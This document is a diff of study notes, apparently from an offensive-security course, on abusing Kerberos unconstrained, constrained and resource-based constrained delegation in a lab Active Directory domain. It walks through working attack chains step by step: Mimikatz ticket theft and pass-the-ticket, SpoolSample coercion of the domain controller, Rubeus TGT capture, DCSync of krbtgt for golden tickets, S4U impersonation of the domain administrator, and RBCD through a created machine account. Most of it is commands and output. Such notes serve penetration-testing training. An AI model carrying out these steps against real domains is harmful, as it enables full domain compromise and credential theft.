+To abuse unconstrained delegation, first compromise the computer or service account.
 
 Typically, a machine would only be configured with unconstrained delegation because it hosts an application that requires it, e.g., an IIS-hosted web site
 
@@ -6208,9 +6296,12 @@ We can either wait for a user to connect or leverage an internal phishing attack
 
 Since the web application is configured with Windows authentication, the Kerberos protocol is used.
 
-Switch back to appsrv01:
+Log in to appsrv01 as the Offsec user, which is local administrator on the target system.
+
+Extract the TGTs supplied by users to IIS.
 
 ```
+privilege::debug
 sekurlsa::tickets
 ```
 
@@ -6224,11 +6315,11 @@ kerberos::ptt [0;9eaea]-2-0-60a10000-admin@krbtgt-PROD.CORP1.COM.kirbi
 exit
 ```
 
+Achieved code execution on the domain controller since the admin user is a member of the Domain Admins group.
+
 ```pwsh
 C:\Tools\SysinternalsSuite\PsExec.exe \\cdc01 cmd
 ```
-
-We have achieved code execution on the domain controller since the admin user is a member of the Domain Admins group.
 
 By default, all users allow their TGT to be delegated, but privileged users can be added to the **Protected Users** group, which blocks delegation. This will also break the functionality of the application that required unconstrained delegation for those users.
 
@@ -6236,17 +6327,17 @@ By default, all users allow their TGT to be delegated, but privileged users can 
 
 We relied on a privileged user accessing the target application.
 
-> Force a high-privileged authentication without any user interaction.
+=> SpoolSample tool is designed to force a Domain Controller to connect back to a system configured with unconstrained delegation.
 
-SpoolSample tool is designed to force a Domain Controller to connect back to a system configured with unconstrained delegation. => allows the attacker to steal a TGT for the domain controller computer account.
+=> Allows the attacker to steal a TGT for the domain controller computer account.
 
-The RPC interface we leveraged locally is indeed also accessible over the network through TCP port 445 if the host firewall allows it.
+The RPC interface we leveraged locally is also accessible over the network through TCP port 445 if the host firewall allows it.
 
 TCP port 445 is typically open on Windows servers, including domain controllers, and the print spooler service runs automatically at startup in the context of the computer account.
 
 The print spooler service must be running and available on the domain controller from appsrv01.
 
-Log in to appsrv01 as the Offsec user and attempt to access the named pipe (only works on pwsh)
+Log in to appsrv01 as the Offsec user and attempt to access the named pipe
 
 ```pwsh
 dir \\cdc01\pipe\spoolss
@@ -6254,9 +6345,9 @@ dir \\cdc01\pipe\spoolss
 
 When the "target" spooler accesses the named pipe on the "attacking" machine, it will present a forwardable TGT along with the TGS if the "attacking" machine is configured with unconstrained delegation.
 
-Use SpoolSample to facilitate the attack. Once the authentication has taken place, we'll look for tickets in memory originating from the domain controller machine account.
+Use SpoolSample to facilitate the attack. Once the authentication has taken place, look for tickets in memory originating from the domain controller machine account.
 
-In the last section, we used Mimikatz to find and extract the forwardable TGT. In addition, we had to write the TGT to disk to reuse it.
+We used Mimikatz to find and extract the forwardable TGT. and write the TGT to disk to reuse it.
 
 => Rubeus C# application
 
@@ -6279,9 +6370,9 @@ Switch back to Rubeus, which displays the TGT for the domain controller account:
 ```
 [*] 4/13/2020 2:45:16 PM UTC - Found new TGT:
 
-  User                  :  CDC01$@PROD.CORP1.COM
+  User                  : CDC01$@PROD.CORP1.COM
   ...
-  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
+  Flags                 : name_canonicalize, pre_authent, renewable, forwarded, forwardable
   Base64EncodedTicket   :
 
     doIFIjCCBR6gAwIBBaEDAgEWooIEIzCCBB9hggQbMIIEF6ADAgEF...
@@ -6291,9 +6382,7 @@ Switch back to Rubeus, which displays the TGT for the domain controller account:
 
 We have forced the domain controller machine account to authenticate to us and give us a TGT.
 
-**krbrelayx**, a Python implementation of this technique. It does not require execution of Rubeus and Spoolsample on the compromised host as it will execute on the Kali machine.
-
-=> Improve this technique by avoiding the write to disk.
+**krbrelayx**, a Python implementation of this technique, does not require execution of Rubeus and Spoolsample on the compromised host as it will execute on the Kali machine. => improve this technique by avoiding the write to disk.
 
 Rubeus monitor outputs the Base64-encoded TGT but it can also inject the ticket into memory with the ptt command:
 
@@ -6301,27 +6390,21 @@ Rubeus monitor outputs the Base64-encoded TGT but it can also inject the ticket 
 Rubeus.exe ptt /ticket:doIFIjCCBR6gAwIBBaEDAgEWo...
 ```
 
-With the TGT of the domain controller machine account injected into memory, we can perform actions in the context of that TGT.
+The CDC01$ account is not a local administrator on the domain controller so we cannot directly perform lateral movement with it. (but it has **domain replication permissions**)
 
-The CDC01$ account is not a local administrator on the domain controller so we cannot directly perform lateral movement with it.
-
-But it has **domain replication permissions** => perform dcsync and dump the password hash of any user, including the special krbtgt account:
+With the TGT of the domain controller machine account injected into memory, perform dcsync and dump the password hash of any user, including the special krbtgt account:
 
 ```
 lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt
 ```
 
-Craft a golden ticket and obtain access to any resource in the domain.
+Craft a golden ticket and obtain access to any resource in the domain. Alternatively, we can dump the password hash of a member of the Domain Admins group.
 
-Alternatively, we can dump the password hash of a member of the Domain Admins group.
-
-We can also use the DLL implementation [Rubeus-Rundll32](https://github.com/rvrsh3ll/Rubeus-Rundll32) which may help bypass application whitelisting.
+Use the DLL implementation [Rubeus-Rundll32](https://github.com/rvrsh3ll/Rubeus-Rundll32) which may help bypass application whitelisting.
 
 ### Constrained Delegation
 
 While unconstrained delegation allowed the service to perform authentication to anything in the domain, constrained delegation **limits the delegation scope**.
-
-Since the Kerberos protocol does not natively support constrained delegation by default, Microsoft released two extensions for this feature: S4U2Self and S4U2Proxy.
 
 Constrained delegation is configured on the **computer or user object**. It is set through the **msds-allowedtodelegateto** property by specifying the SPNs the current object is allowed constrained delegation against.
 
@@ -6341,61 +6424,55 @@ serviceprincipalname     : HTTP/web
 useraccountcontrol       : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_TO_AUTH_FOR_DELEGATION
 ```
 
-Constrained delegation is configured for the IISSvc account. It is a service account for a web server running IIS.
+Constrained delegation is configured for the IISSvc account, i.e. a service account for a web server running IIS.
 
-The **msds-allowedtodelegateto** property contains the SPN of the MS SQL server on CDC01. => constrained delegation is only allowed to that SQL server.
+The **msds-allowedtodelegateto** property contains the SPN of the MS SQL server on CDC01
 
-TRUSTED_TO_AUTH_FOR_DELEGATION value in the useraccountcontrol property is set. This value is used to indicate whether constrained delegation can be used if the authentication between the user and the service uses a different authentication mechanism like NTLM.
-
-**S4U2Self** extension:
+=> Constrained delegation is only allowed to that SQL server.
  
-If a **frontend** service does not use Kerberos authentication and the backend service does, it needs to be able to request a TGS to the frontend service from a KDC on behalf of the user who is authenticating against it. The S4U2Self extension enables this if the TRUSTED_TO_AUTH_FOR_DELEGATION value is present in the useraccountcontrol property. Additionally, the frontend service can do this without requiring the password or the hash of the user.
+If a **frontend** service does not use Kerberos authentication and the backend service does, it needs to be able to request a **TGS to the frontend service** from a KDC on behalf of the user who is authenticating against it.
+
+=> The **S4U2Self** extension enables this if the **TRUSTED_TO_AUTH_FOR_DELEGATION** value is present in the **useraccountcontrol** property. Additionally, the frontend service can do this without requiring the password or the hash of the user.
 
 => If we compromise the IISSvc account, we can request a service ticket to IIS for any user in the domain, including a domain administrator.
 
-**S4U2proxy** extension requests a service ticket for the **backend** service on behalf of a user. This extension depends on the service ticket obtained either through S4U2Self or directly from a user authentication via Kerberos.
+**S4U2proxy** extension requests a **service ticket for the backend service** on behalf of a user. This extension depends on the service ticket obtained either through S4U2Self or directly from a user authentication via Kerberos.
 
-If Kerberos is used for authentication to the frontend service, S4U2Proxy can use a forwardable TGS supplied by the user.
+If Kerberos is used for authentication to the frontend service, S4U2Proxy can use a forwardable TGS supplied by the user (need user interaction)
 
-=> Similarly to our initial attack that leveraged unconstrained delegation, we would require user interaction.
+E.g., S4U2Proxy allows IISSvc to request a service ticket to any of the services listed as SPNs in the **msds-allowedtodelegateto** field.
 
-This extension allows IISSvc to request a service ticket to any of the services listed as SPNs in the msds-allowedtodelegateto field.
-
-It would use the TGS obtained through the S4USelf extension and submit it as a part of the S4UProxy request for the backend service.
-
-Once this service ticket request is made and the ticket is returned by the KDC, IISSvc can perform authentication to that specific service on that specific host.
+It would use the TGS obtained through the **S4USelf** extension and submit it as a part of the **S4UProxy** request for the backend service.
 
 If we compromise the IISSvc account, we can request a service ticket for the services listed in the msds-allowedtodelegateto field as any user in the domain. Depending on the type of service, this may lead to code execution.
 
-Simulate a compromise of the IISSvc account and abuse that to gain access to the MSSQL instance on CDC01.
+Abuse a compromise of the IISSvc account to gain access to the MSSQL instance on CDC01.
 
-=> Rubeus, which includes S4U extension support.
+=> Rubeus includes S4U extension support.
 
-Kekeo by Mimikatz also provides access to S4U extension abuse.
+**Kekeo** by Mimikatz also provides access to S4U extension abuse.
 
-Note that we do not need to execute in the context of the IISSvc account in order to exploit the account. We only need the password hash.
+We only need the password hash of the IISSvc account in order to exploit the account.
 
-However, if we only have the clear text password, we can generate the NTLM hash with Rubeus:
+If we only have the clear text password, we can generate the NTLM hash with Rubeus:
 
 ```pwsh
 .\Rubeus.exe hash /password:lab
 ```
 
-use Rubeus to generate a TGT for IISSvc
+Use Rubeus to generate a TGT for IISSvc
 
-```pwsh
-.\Rubeus.exe asktgt /user:iissvc /domain:prod.corp1.com /rc4:2892D26CDF84D7A70E2EB3B9F05C425E /nowrap
+```bat
+Rubeus.exe asktgt /user:iissvc /domain:prod.corp1.com /rc4:2892D26CDF84D7A70E2EB3B9F05C425E /nowrap
 ```
 
-Invoke the S4U extensions.
+Invoke the S4U extensions to obtain a service ticket for the MSSQL service instance on CDC01.
 
-The username we want to impersonate (/impersonateuser), the administrator account of the domain
+The username we want to impersonate (/impersonateuser) is the administrator account of the domain
 
 ```pwsh
 .\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /ptt
 ```
-
-We obtained a usable service ticket for the MSSQL service instance on CDC01.
 
 Validate that we are authenticated to MSSQL as the impersonated user:
 
@@ -6403,11 +6480,9 @@ Validate that we are authenticated to MSSQL as the impersonated user:
 .\SQL.exe
 ```
 
-We have logged in to the MSSQL instance as the domain administrator.
+By compromising an account that has constrained delegation enabled, we can gain access to all the services configured through the **msDS-AllowedToDelegateTo** property. If the **TRUSTED_TO_AUTH_FOR_DELEGATION** value is set, we can do this **without user interaction**.
 
-By compromising an account that has constrained delegation enabled, we can gain access to all the services configured through the msDS-AllowedToDelegateTo property. If the **TRUSTED_TO_AUTH_FOR_DELEGATION** value is set, we can do this **without user interaction**.
-
-Interestingly, when the TGS is returned from the KDC, the server name is encrypted, but not the service name.
+When the TGS is returned from the KDC, the server name is encrypted, but not the service name.
 
 => Modify the service name within the TGS in memory and obtain access to a different service on the same host.
 
@@ -6417,19 +6492,21 @@ Attempt to gain access to the CIFS service:
 .\Rubeus.exe s4u /ticket:doIE+jCCBPag... /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /altservice:CIFS /ptt
 ```
 
-This TGS should yield access to the file system and potentially direct code execution. Unfortunately, the SPN for the MSSQL server ends with ":1433", which is not usable for CIFS since it requires an SPN with the format `CIFS/cdc01.prod.corp1.com`.
+This TGS should yield access to the file system and potentially direct code execution. Unfortunately, the **SPN** for the MSSQL server ends with ":1433", which is not usable for CIFS since it requires an SPN with the format `CIFS/cdc01.prod.corp1.com`.
 
-If the SPN configured for constrained delegation only uses the service and host name like www/cdc01.prod.corp1.com, we could modify the TGS to access any service on the system.
+If the SPN configured for constrained delegation only uses the service and host name like `www/cdc01.prod.corp1.com`, we could modify the TGS to access any service on the system.
 
 ### Resource-Based Constrained Delegation
 
-Constrained delegation works by configuring SPNs on the frontend service under the **msDS-AllowedToDelegateTo** property. Configuring constrained delegation requires the **SeEnableDelegationPrivilege** privilege on the domain controller, which is typically only enabled for Domain Admins.
+Constrained delegation works by configuring SPNs on the frontend service under the **msDS-AllowedToDelegateTo** property.
+
+Configuring constrained delegation requires the **SeEnableDelegationPrivilege** privilege on the domain controller, which is typically only enabled for Domain Admins.
 
 Resource-based constrained delegation (RBCD) is meant to remove the requirement of highly elevated access rights like **SeEnableDelegationPrivilege** from system administrators.
 
 The **msDS-AllowedToActOnBehalfOfOtherIdentity** property controls delegation **from the backend service**. To configure RBCD, the SID of the frontend service is written to the new property of the backend service.
 
-RBCD can typically be configured by the backend service administrator instead.
+=> RBCD can typically be configured by the backend service administrator instead.
 
 Once RBCD has been configured, the frontend service can use S4U2Self to request the forwardable TGS for any user to itself followed by S4U2Proxy to create a TGS for that user to the backend service.
 
@@ -6443,7 +6520,7 @@ The same attack against constrained delegation applies to RBCD if we can comprom
 
 E.g., A RBCD attack that leads to code execution on appsrv01.
 
-Starts by compromising a domain account that has the **GenericWrite** access right on a computer account object.
+Starts by compromising a domain account that has the **GenericWrite** access right on a computer account object (user dave)
 
 ```pwsh
 Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
@@ -6456,7 +6533,7 @@ ActiveDirectoryRights : ListChildren, ReadProperty, GenericWrite
 Identity              : PROD\dave
 ```
 
-The dave user has GenericWrite to appsrv01.
+The dave user has **GenericWrite** to appsrv01.
 
 We can update any non-protected property on that object, including **msDS-AllowedToActOnBehalfOfOtherIdentity** and add the SID of a different computer.
 
@@ -6464,7 +6541,7 @@ Once a SID is added, we will act in the context of that computer account and we 
 
 We either have to obtain the password hash of a computer account or simply create a new computer account object with a selected password.
 
-By default, any authenticated user can add up to 10 computer accounts to the domain and they will have SPNs set automatically. This value is present in the ms-DS-MachineAccountQuota property in the Active Directory domain object.
+By default, any authenticated user can add up to 10 computer accounts to the domain and they will have SPNs set automatically. This value is present in the **ms-DS-MachineAccountQuota** property in the AD domain object.
 
 Enumerate ms-DS-MachineAccountQuota
 
@@ -6472,21 +6549,29 @@ Enumerate ms-DS-MachineAccountQuota
 Get-DomainObject -Identity prod -Properties ms-DS-MachineAccountQuota
 ```
 
-Normally, the computer account object is created when a physical computer is joined to the domain. We can simply create the object itself with the New-MachineAccount method of the Powermad.ps1 PowerShell script.
+Normally, the computer account object is created when a physical computer is joined to the domain.
+
+We can simply create the object itself with the **New-MachineAccount** method of the `Powermad.ps1` PowerShell script.
 
 ```pwsh
 . .\powermad.ps1
+```
 
+```pwsh
 New-MachineAccount -MachineAccount myComputer -Password $(ConvertTo-SecureString 'h4x' -AsPlainText -Force)
+```
 
+```pwsh
 Get-DomainComputer -Identity myComputer
 ```
 
-The msDS-AllowedToActOnBehalfOfOtherIdentity property stores the SID as part of a security descriptor in a binary format. We must convert the SID of our newly-created computer object to the correct format in order to proceed with the attack.
+The **msDS-AllowedToActOnBehalfOfOtherIdentity** property stores the SID as part of a security descriptor in a binary format.
 
-Create a new security descriptor with the correct SID. In the beginning of this module, we determined that the SID is the last portion of a security descriptor string so we can reuse a working string, replacing only the SID.
+Create a new security descriptor with the correct SID. 
 
-Fortunately, security researchers have discovered a valid security descriptor string that we can use as shown in Listing 37. We can use the RawSecurityDescriptor class to instantiate a SecurityDescriptor object:
+The SID is the last portion of a security descriptor string.
+
+Use the **RawSecurityDescriptor** class to instantiate a **SecurityDescriptor** object:
 
 ```pwsh
 $sid =Get-DomainComputer -Identity myComputer -Properties objectsid | Select -Expand objectsid
@@ -6494,22 +6579,22 @@ $sid =Get-DomainComputer -Identity myComputer -Properties objectsid | Select -Ex
 $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
 ```
 
-With the SecurityDescriptor object created, we must convert it into a byte array to match the format for the msDS-AllowedToActOnBehalfOfOtherIdentity property:
+Convert it into a byte array to match the format for the msDS-AllowedToActOnBehalfOfOtherIdentity property:
 
 ```pwsh
 $SDbytes = New-Object byte[] ($SD.BinaryLength)
 $SD.GetBinaryForm($SDbytes,0)
 ```
 
-Obtain a handle to the computer object for appsrv01 and then pipe that into Set-DomainObject, which can update properties by specifying them with -Set options (Setting msds-allowedtoactonbehalfofotheridentity)
+Obtain a handle to the computer object for appsrv01 and then pipe that into **Set-DomainObject**, which can update properties by specifying them with -Set options.
 
 ```pwsh
 Get-DomainComputer -Identity appsrv01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
 ```
 
-Since our dave user has the GenericWrite access right to appsrv01, we can set this property.
+Since our dave user has the **GenericWrite** access right to appsrv01, we can set this property.
 
-We can also use this attack vector with GenericAll, WriteProperty, or WriteDACL access rights to appsrv01.
+We can also use this attack vector with **GenericAll**, **WriteProperty**, or **WriteDACL** access rights to appsrv01.
 
 After writing the SecurityDescriptor to the property field, we should verify it
 
@@ -6527,31 +6612,40 @@ Verifying the SID in the SecurityDescriptor
 ConvertFrom-SID S-1-5-21-3776646582-2086779273-4091361643-2101
 ```
 
-The SecurityDescriptor was indeed set correctly in the msDS-AllowedToActOnBehalfOfOtherIdentity property for appsrv01.
-Now we can begin our attack in an attempt to compromise appsrv01. We'll start by obtaining the hash of the computer account password with Rubeus:
+Obtain the hash of the computer account password with Rubeus:
 
 ```pwsh
 .\Rubeus.exe hash /password:h4x
 ```
 
-In the previous section, we used the Rubeus asktgt command to request a TGT before invoking the s4u command. We can also directly submit the username and password hash to the s4u command, which will implicitly call asktgt and inject the resultant TGT, after which the S4U extensions will be invoked:
+We used the Rubeus **asktgt** command to request a TGT before invoking the **s4u** command.
 
-```
+We can also directly submit the username and password hash to the s4u command, which will implicitly call asktgt and inject the resultant TGT, after which the S4U extensions will be invoked:
+
+```pwsh
 .\Rubeus.exe s4u /user:myComputer$ /rc4:AA6EAFB522589934A6E5CE92C6438221 /impersonateuser:administrator /msdsspn:CIFS/appsrv01.prod.corp1.com /ptt
 ```
 
 After obtaining the TGT for the myComputer machine account, S4U2Self will then request a forwardable service ticket as the administrator user to the myComputer computer account.
+
 Finally, S4U2Proxy is invoked to request a TGS for the CIFS service on appsrv01 as the administrator user, after which it is injected into memory.
-To check the success of this attack, we'll first dump any loaded Kerberos tickets with klist:
+
+To check the success of this attack, dump any loaded Kerberos tickets:
 
 ```pwsh
 klist
 ```
 
-Now that we have a TGS for the CIFS service on appsrv01 as administrator, we can interact with file services on appsrv01 in the context of the administrator domain admin user:
+We have a TGS for the CIFS service on appsrv01 as administrator:
 
 ```pwsh
 dir \\appsrv01.prod.corp1.com\c$
 ```
 
-Our access to appsrv01 is in the context of the administrator domain admin user. We can use our CIFS access to obtain code execution on appsrv01, but in the process we will perform a network login instead of an interactive login. => our access will be limited to appsrv01 and cannot directly be used to expand access towards the rest of the domain.
+We can use our CIFS access to obtain code execution on appsrv01, but in the process we will perform a network login instead of an interactive login.
+
+U> our access will be limited to appsrv01 and cannot directly be used to expand access towards the rest of the domain.
+
+## Active Directory Forest Theory
+
+## Active Directory Trust in a Forest
